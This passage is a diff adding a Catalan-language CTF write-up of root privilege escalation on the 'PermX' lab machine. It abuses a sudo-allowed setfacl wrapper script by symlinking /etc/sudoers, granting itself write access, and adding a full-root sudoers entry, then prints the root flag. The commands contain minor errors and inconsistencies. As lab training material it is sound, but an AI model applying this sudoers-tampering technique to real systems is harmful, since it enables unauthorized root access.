@@ -468,3 +468,115 @@ mtz@permx:~$ cat user.txt
 ```
 
 Ara que ja tenim la flag de l'usuari, mirarem d'escalar privilegis per aconseguir la de l'usuari root:
+
+Amb la comanda sudo -l hem trobat el següent script que pot ser executat ja que aquesta comanda  mostra una llista dels permisos específics de sudo que s'han atorgat a l'usuari actual. Aquesta llista pot incloure les ordres que l'usuari pot executar amb `sudo` i quins permisos o restriccions s'apliquen a aquestes comandes. Per tant provarem d'utilitzar-ho:
+
+```
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
+
+L'script acl.sh:
+
+```
+mtz@permx:/opt$ cat /opt/acl.sh
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"`
+```
+
+Per tant, intentarem el següent:
+
+Crear l'script per escalar privilegis, creem un fitxer anomenat privilege_escalation.sh a /home/mtz amb el següent contingut:
+
+```
+#!/bin/bash 
+/bin/bash
+```
+
+Aquest script simplement obre una shell. Amb permisos root, obriria una shell amb privilegis root.
+
+Enns assegurem que l'script que hem creat és executable:
+
+``chmod +x /home/mtz/privilege_escalation.sh``
+
+Utilitzem l'script acl.sh per donar permisos:
+
+``sudo /opt/acl.sh mtz rwx /home/mtz/privilege_escalation.sh``
+
+Executem l'script a veure si tenim sort:
+
+``/home/mtz/privilege_escalation.sh``
+
+No ha funcionat, haurem de provar altres coses. Després de vàries hores intent altres coses amb sudo -l ja que sembla que la cosa va per aquí, hem provat el següent amb èxit:
+
+Crear un enllaç simbòlic al fitxer /etc/sudoers utilitzant la comanda ln -s, creem l'enllaç simbòlic anomenat helpfile al fitxer /etc/sudoers. Això crea un punt d'accés directe a aquest fitxer des de la carpeta /home/mtz.
+
+``ln -s /etc/sudoers /home/mtz/helpfile``
+
+Modifiquem els permisos de l'enllaç simbòlic amb l'acl.sh per permetre la lectura i escriptura per a l'usuari mtz.
+
+``sudo /opt/acl.sh mtz rw /home/mtz/helpfile``
+
+Modifiquem el fitxer /etc/sudoers per afegir l'usuari mtz amb permissos de root. Això es pot fer afegint la línia següent:
+
+``nano sudoers``
+
+```
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+mtz     ALL=(ALL:ALL) ALL`
+```
+
+
+Això permetrà a l'usuari mtz executar qualsevol comanda amb permisos de root sense necessitat de contrasenya.
+
+I ara un cop hem modificat el fitxer /etc/sudoers ja podem utilitzar la comanda sudo su per canviar a l'usuari root sense necessitat de contrasenya. 
+
+Executem la comanda sudo su i posem la contrasenya de l'usuari mtz que hem aconseguit abans com a credencials de la BD i ja serem root:
+
+```
+mtz@permx:/etc$ sudo su
+[sudo] password for mtz: 
+root@permx:/etc# 
+```
+
+Ara, busquem la flag de l'usuari root i ja haurem completat la màquina:
+
+```
+root@permx:/etc# cd /root
+root@permx:~# cat root.txt 
+2295bfc1eaee5a9aea4d7929aa5cc93a
+root@permx:~# `
+```
+
+La màquina completada:
+
+![image](https://github.com/user-attachments/assets/de7e2dc8-3cfc-4adb-9666-94e525668508)
+
+
+
